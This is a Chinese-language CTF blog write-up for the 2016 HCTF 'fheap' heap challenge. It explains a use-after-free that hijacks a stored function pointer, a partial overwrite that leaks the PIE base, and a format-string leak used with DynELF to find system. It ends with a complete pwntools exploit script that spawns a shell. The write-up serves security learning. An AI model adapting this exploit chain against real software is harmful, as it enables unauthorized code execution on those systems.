---
title: 2016 HCTF fheap (UAF方法)
date: 2018-04-02 08:57:14
categories: 
	
tags:
	- CTF
	- Use-After-Free

---



## 程序分析

64为程序， 开启 PIE, NX, Canary

PIE是指代码段的地址也会随机化，**不过低两位的字节是固定的，利用这一点我们可以来泄露出程序的地址。**

```
$ checksec pwn-f 
[*] '/home/pwn/\xe6\xa1\x8c\xe9\x9d\xa2/AUF-hctf2016-fheap/pwn-f'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

1. create string:

先创建一个0x20大小结构体chunk，保存内容，如果输入的内容>x0f ,  就保存到结构体chunk中，否则就malloc一个chunk保存数据，然后*chunk+3 保存 free函数

2. delete string

   执行 *chunk+3 保存函数

![img](2016-hctf-fheap/img-1.png)



## 思路

首先是利用uaf，利用堆块之间申请与释放的步骤，形成对free_func指针的覆盖。从而达到劫持程序流的目的。

具体来说，先申请的是三个字符创小于0xf的堆块，并将其释放。

此时fastbin中空堆块的单链表结构如下左图，紧接着再申请一个字符串长度为0x20的字符串，此时，申请出来的堆中的数据会如下右图，此时后面申请出来的堆块与之前申请出来的1号堆块为同一内存空间，这时候输入的数据就能覆盖到1号堆块中的free_func指针，指向我们需要执行的函数，随后再调用1号堆块的free_func函数，即实现了劫持函数流的目的。

![img](2016-hctf-fheap/img-2.png)



### 泄露基址

我们要知道堆的释放是一个先入后出的队列，也就是说你第最后一个释放，那么就地一个用，就本体而言首先申请三个堆块 ，其实两个就可以。

```python
    create(4,'aa')
    create(4,'bb')
    delete(1)
    delete(0)
```

通过调用puts函数打印该函数的地址， 为什么选择\x2d ,内存中第二个字节一样。

```python
  	payload = "aaaaaaaa".ljust(0x18,'b')+'\x2d'
    # recover low bits,the reason why i choose \x2d is that the system flow decide by
    create_str(0x20,payload)
    delete_str(1) # 泄露内存地址
    #step 3 leak base addr
    sh.recvuntil('b'*0x10)
    data = sh.recvuntil('\n')[:-1]
    if len(data)>8:
        data=data[:8]    
    data = u64(data.ljust(0x8,'\x00'))# leaked puts address use it to calc base addr
    base_addr = data - 0xd2d
```

找到了plt表的基地址，下面就是对于格式化字符串的利用

### 格式化字符串

我们想要知道system的地址，在没有libc的环境下，利用格式化字符串泄露内存地址从而得到system的加载地址

格式化字符串的洞，一开始不知道怎么发现的。格式化字符串的洞必须满足以下条件：

1. 用户的输入必须能打印 
2. 用户输入的字符串在printf函数栈的上方（先压栈）

就这两个条件我们很快可以分析出漏洞的点就在create & delete 函数 
我们首先create字符串调用delete 此时freeshort地址变成了printf，可以控制打印 
但是我们的参数放在哪里呢？ 
我们又发现当输入yes时yes字符串在堆栈的位置正好是printf的上方

下面找一下printf的偏移 
![这里写图片描述](2016-hctf-fheap/img-3.png)

64位的格式化字符串 [参见这篇博客](http://blog.csdn.net/qq_31481187/article/details/72510875) 

![img](2016-hctf-fheap/img-4.png)

```
执行 call eax 即 printf 时候，ebp = rsp ， 
…431a0  为EBP
…4e1a8  为ret地址
…4e1b0  为printf 的参数。
```

找到偏移是9 
这时编写leak函数

```python
def leak(addr):
    delete_str(0)
    payload = 'a%9$s'.ljust(0x18,'#') + p64(printf_addr)
    create_str(0x20,payload)
    sh.recvuntil("quit")
    sh.send("delete ")    
    sh.recvuntil("id:")
    sh.send(str(1)+'\n')
    sh.recvuntil("?:")
    sh.send("yes.1111"+p64(addr)+"\n")  
    sh.recvuntil('a')
    data = sh.recvuntil('####')[:-4]
    if len(data) == 0:
        return '\x00'
    if len(data) <= 8:
        print hex(u64(data.ljust(8,'\x00')))
    return data
```

### 泄露system地址并使用

```python
    #step 5 leak system addr
    create_str(0x20,payload)
    delete_str(1)
    #this one can not be ignore because DynELF use the delete_str() at begin     
    d = DynELF(leak, base_addr, elf=ELF('./pwn-f'))
    system_addr = d.lookup('system', 'libc')
    print 'system_addr:'+hex(system_addr)
    #step 6 recover old function to system then get shell
    delete_str(0)
    create_str(0x20,'/bin/bash;'.ljust(0x18,'#')+p64(system_addr))
    #attention /bin/bash; i don`t not why add the ';'
    delete_str(1)
    sh.interactive()
```



## 利用

[hctf2016-fheap-master.zip](2016-HCTF-fheap/hctf2016-fheap-master.zip)

```python
#coding=utf8
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
sh = process('./pwn-f')

def create_str(size,str1):
    sh.recvuntil("quit")
    sh.send("create ")
    sh.recvuntil("size:")
    sh.send(str(size)+'\n')
    sh.recvuntil("str:")
    sh.send(str1)#here why can not i user '\n'
    # print '|',sh.recvuntil('\n')[:-1],'|'

def delete_str(idn):
    sh.recvuntil("quit")
    sh.send("delete ")
    sh.recvuntil("id:")
    sh.send(str(idn)+'\n')
    sh.recvuntil("?:")
    sh.send("yes"+"\n")

def leak(addr):
    delete_str(0)    
    payload = 'a%9$s'.ljust(0x18,'#') + p64(printf_addr)
    create_str(0x20,payload)
    sh.recvuntil("quit")
    sh.send("delete ")    
    sh.recvuntil("id:")
    sh.send(str(1)+'\n')
    sh.recvuntil("?:")
    sh.send("yes.1111"+p64(addr)+"\n")  
    sh.recvuntil('a')
    data = sh.recvuntil('####')[:-4]
    if len(data) == 0:
        return '\x00'
    if len(data) <= 8:
        print hex(u64(data.ljust(8,'\x00')))
    return data

def main():
    global printf_addr#set global printf addr cus leak() use it 
    
    #step 1 create & delete
    create_str(4,'aa')
    create_str(4,'aa')
    delete_str(1)
    delete_str(0)
    
    #step 2 recover old function addr
    pwn = ELF('./pwn-f')
    payload = "aaaaaaaa".ljust(0x18,'b')+'\x2d'
    # recover low bits,the reason why i choose \x2d is that the system flow decide by
    create_str(0x20,payload)
    delete_str(1) # 泄露内存地址
    
    #step 3 leak base addr
    sh.recvuntil('b'*0x10)
    data = sh.recvuntil('\n')[:-1]
    if len(data)>8:
        data=data[:8]    
    data = u64(data.ljust(0x8,'\x00'))# leaked puts address use it to calc base addr
    base_addr = data - 0xd2d
    
    #step 4 get printf func addr
    printf_offset = pwn.plt['printf']
    printf_addr = base_addr + printf_offset #get real printf addr
    delete_str(0)   #free
    gdb.attach(sh)
    
    # #step 5 leak system addr
    create_str(0x20,'payload')
    delete_str(1)
    #this one can not be ignore because DynELF use the delete_str() at begin  
    d = DynELF(leak, base_addr, elf=ELF('./pwn-f'))
    system_addr = d.lookup('system', 'libc')
    print 'system_addr:'+hex(system_addr)

    #step 6 recover old function to system then get shell
    delete_str(0)
    create_str(0x20,'/bin/bash;'.ljust(0x18,'#')+p64(system_addr))
    #attention /bin/bash; i don`t not why add the ';'
    delete_str(1)
    sh.interactive()
    
if __name__ == '__main__':
    print 1
    main()
```



## 参考

https://blog.csdn.net/qq_31481187/article/details/73612451

https://blog.csdn.net/qq_31481187/article/details/72510875#t8

https://www.jianshu.com/p/097e211cd9eb

https://www.anquanke.com/post/id/85281

https://www.anquanke.com/post/id/85007